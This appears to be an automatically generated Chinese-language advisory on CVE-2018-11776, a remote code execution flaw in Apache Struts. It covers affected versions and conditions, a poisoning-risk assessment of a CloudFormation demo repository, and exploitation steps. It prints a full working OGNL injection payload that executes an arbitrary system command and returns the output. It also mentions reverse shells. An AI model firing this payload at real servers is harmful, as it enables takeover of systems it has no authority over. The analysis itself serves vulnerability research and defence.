## CVE-2018-11776-Apache Struts远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace为true，结果未指定namespace或namespace为通配符

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776是Apache Struts 2中的一个远程代码执行漏洞。当`alwaysSelectFullNamespace`设置为true时（无论是用户配置还是插件如Convention Plugin所致），且满足以下条件，就可能发生RCE：

*   结果 (results) 在没有命名空间的情况下使用，并且其上层包没有或拥有通配符命名空间。
*   使用url标签，该标签没有value和action设置，并且其上层包没有或拥有通配符命名空间。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码（CloudFormation模板），可以判定此漏洞的POC是有效的。漏洞库信息中明确指出存在公开可用的利用代码 (例如：https://github.com/hook-s3c/CVE-2018-11776-Python-PoC )，搜索结果也表明该漏洞已被广泛研究并存在多种利用方式。提供的CloudFormation模板旨在快速部署一个包含易受攻击的Struts2实例的环境，并提供用于验证和利用漏洞的命令。

**投毒风险分析：**

漏洞利用代码（CloudFormation模板）本身是用于搭建一个可用于测试CVE-2018-11776漏洞的环境，从模板内容来看，主要用于配置AWS资源，例如VPC，子网，安全组和EC2实例。虽然没有明显的恶意代码，但仍存在一定的投毒风险，因为攻击者可能会修改模板，例如：

1.  **在EC2实例的启动脚本中植入后门。** 模板定义了EC2实例，攻击者可以在启动脚本中添加恶意代码，例如下载并执行恶意软件。
2.  **修改安全组规则。** 模板定义了安全组规则，攻击者可以添加允许从任意IP地址访问的规则，从而暴露更多端口和服务。
3.  **修改镜像AMI** 替换成带有后门的AMI镜像。

此外，`RunReverseShell` 命令也可能被恶意修改以执行其他命令，并非仅仅建立反向连接。

综合考虑，虽然提供的代码主要用于漏洞演示，但如果被恶意修改，存在一定的投毒风险，风险预估为10%。

**利用方式分析：**

利用方式主要通过构造恶意的URL，触发OGNL表达式注入，从而执行任意代码。具体步骤如下：

1.  **确定目标系统满足漏洞利用条件。** 即`alwaysSelectFullNamespace`为true，且存在未指定namespace的result或url标签，或者其上层package的namespace为通配符。
2.  **构造恶意URL。** URL中包含OGNL表达式，用于执行任意命令。例如：
    ```
    ${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
    ```
3.  **发送恶意URL到目标系统。** 目标系统解析URL时，会执行OGNL表达式，从而执行攻击者指定的命令。

攻击者可以通过反向shell等方式获取目标系统的控制权。

**项目地址:** [OzNetNerd/apche-struts-vuln-demo-cve-2018-11776](https://github.com/OzNetNerd/apche-struts-vuln-demo-cve-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)